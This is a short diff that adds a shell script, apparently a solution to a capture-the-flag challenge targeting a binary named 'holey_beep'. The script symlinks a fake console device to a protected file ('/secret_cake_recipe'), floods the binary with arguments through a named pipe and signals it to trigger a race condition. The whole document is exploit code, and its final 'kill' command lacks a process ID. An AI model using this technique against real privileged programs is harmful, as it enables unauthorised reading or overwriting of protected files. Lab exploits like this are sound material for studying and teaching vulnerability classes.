@@ -1,0 +1,8 @@
+cd /tmp
+mkdir dev
+ln -s /secret_cake_recipe /tmp/dev/console
+mkfifo pp
+/home/user/holey_beep $( seq 1 1 5000 ) 2> /tmp/pp &
+( sleep 15 ; cat  ) < /tmp/pp &
+pgrep holey_beep
+kill -15
